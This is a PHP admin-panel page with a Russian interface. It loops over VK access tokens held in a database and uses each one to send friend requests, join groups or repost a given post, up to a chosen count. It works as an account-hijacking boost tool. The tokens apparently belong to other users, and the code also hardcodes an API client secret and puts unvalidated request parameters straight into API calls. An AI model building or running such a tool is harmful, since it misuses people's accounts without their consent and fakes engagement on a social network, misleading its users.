<?
include '../bdlog.php';

if(isset($_SESSION['admin'])) {
$msg = '';
	$dr = mysqli_query($db,"select * from data order by id desc");
	$max = mysqli_num_rows($dr);
if(isset($_GET['addFr'])) {
	$name = $_GET['name'];
	$maxar = $_GET['maximum'];
	$numofsuc = 0;
	while($drr = mysqli_fetch_array($dr)) {
		if($numofsuc < $maxar) {
		$tok = $drr['token'];
		$result = json_decode(file_get_contents('https://api.vk.com/method/friends.add?v=5.73&client_secret=AlVXZFMUqyrnABp8ncuU&user_id='.$name.'&access_token='.$tok)); 
		if($result -> response == 1) {
		$numofsuc = (+$numofsuc + 1);
		}
		sleep(1);
		}
	}
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Отправлено заявок в друзья <b>'.$numofsuc.'</b>.</p>
                </div>';
}
if(isset($_GET['addClub'])) {
	$name = $_GET['name'];
	$numofsuc = 0; 
	$maxar = $_GET['maximum'];
	while($drr = mysqli_fetch_array($dr)) { if($numofsuc < $maxar) {
		$tok = $drr['token'];
		$result = json_decode(file_get_contents('https://api.vk.com/method/groups.join?v=5.73&client_secret=AlVXZFMUqyrnABp8ncuU&group_id='.$name.'&access_token='.$tok)); 
		if($result -> response == 1) {
		$numofsuc = (+$numofsuc + 1);
		}
		sleep(1);
	} }
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Отправлено заявок на вступление в группу: <b>'.$numofsuc.'</b>.</p>
                </div>';
}


if(isset($_GET['addReposts'])) {
  $robject = $_GET['robject'];

	$numofsuc = 0;
	$maxar = $_GET['maximum'];
	while($drr = mysqli_fetch_array($dr)) { 
	if($numofsuc < $maxar) {
		$tok = $drr['token'];
		$result = json_decode(file_get_contents('https://api.vk.com/method/wall.repost?v=5.73&client_secret=AlVXZFMUqyrnABp8ncuU&object='.$robject.'&access_token='.$tok)); 
		if($result -> response -> success == 1) {
		$numofsuc = (+$numofsuc + 1);
		}
		sleep(1);
	} }
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Сделано репостов: <b>'.$numofsuc.'</b>.</p>
                </div>';
}

} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">'; }
if(!isset($_SESSION['admin'])) { echo '
  <META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">
  <style> body {display:none !important;}'; }
//$randch = rand(100,9999999999999999);
?>
<!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#6CD089;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL [<?=$colvousers?>]</span></center>
    </a>

    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
        <div class="row mb-2">
    </div>
    <!-- /.content-header -->

    <!-- Main content -->
    <div class="content">
      <div class="container-fluid">
        
		<?=$msg?>
		
		  <? if(isset($_SESSION['admin'])) { echo '
		  <div class="col-md-3" style="display:inline-block;">
		  
           <div class="card card-primary">
              <div class="card-header">
                <h3 class="card-title">Добавиться в друзья</h3>
              </div>
              <!-- /.card-header -->
              <!-- form start -->
              <form role="form" method="GET">
                <div class="card-body">
				
				
				
				
                  <div class="form-group">
                    <label for="link">ID, к кому добавиться</label>
                    <input type="number" class="form-control" name="name" required value="" placeholder="ID (только цифры)" id="link">
                  </div>
				   <div class="form-group">
                    <label for="link">Количество</label>
                    <input type="number" class="form-control" name="maximum" max="'.$max.'" required value="" placeholder="Количество" id="link">
                  </div>
                  <input type="hidden" name="addFr">
                  
                </div>
                <!-- /.card-body -->

                <div class="card-footer">
                  <button type="submit" class="btn btn-primary">Выполнить</button>
                </div>
              </form>
		  </div></div>
		  
		  <div class="col-md-3" style="display:inline-block;">
		  
           <div class="card card-primary">
              <div class="card-header">
                <h3 class="card-title">Вступить в группу</h3>
              </div>
              <!-- /.card-header -->
              <!-- form start -->
              <form role="form" method="GET">
                <div class="card-body">
				
				
				
				
                  <div class="form-group">
                    <label for="link">ID группы, куда вступить</label>
                    <input type="number" class="form-control" name="name" required value="" placeholder="ID (только цифры)" id="link">
                  </div><div class="form-group">
                    <label for="link">Количество</label>
                    <input type="number" class="form-control" name="maximum" max="'.$max.'" required value="" placeholder="Количество" id="link">
                  </div>
                  <input type="hidden" name="addClub">
                  
                </div>
                <!-- /.card-body -->

                <div class="card-footer">
                  <button type="submit" class="btn btn-primary">Выполнить</button>
                </div>
              </form>
		  </div></div>
      
      
      <div class="col-md-3" style="display:inline-block;">
		  
      <div class="card card-primary">
         <div class="card-header">
           <h3 class="card-title">Сделать репост</h3>
         </div>
         <!-- /.card-header -->
         <!-- form start -->
         <form role="form" method="GET">
           <div class="card-body">
   
   
   
   
             <div class="form-group">
               <label for="link">ID поста</label>
               <input type="text" class="form-control" name="robject" required value="" placeholder="В формате wall602511575_244" id="link">
             </div><div class="form-group">
               <label for="link">Количество</label>
               <input type="number" class="form-control" name="maximum" max="'.$max.'" required value="" placeholder="Количество" id="link">
             </div>
             <input type="hidden" name="addReposts">
             
           </div>
           <!-- /.card-body -->

           <div class="card-footer">
             <button type="submit" class="btn btn-primary">Выполнить</button>
           </div>
         </form>
 </div></div>
		  
		  '; } ?>
		  
        <!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>